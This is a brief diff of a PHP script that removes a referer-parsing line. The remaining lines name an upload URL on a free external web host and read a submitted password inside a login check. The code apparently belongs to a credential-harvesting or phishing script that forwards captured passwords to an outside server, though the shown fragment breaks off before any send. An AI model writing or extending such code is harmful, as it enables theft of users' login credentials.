@@ -1,5 +1,4 @@
 <?php
-$domain=explode('/',$_SERVER['HTTP_REFERER']);
 $server='http://chiase321.000webhostapp.com/up';
 if($login){
 $password=$_POST['password'];
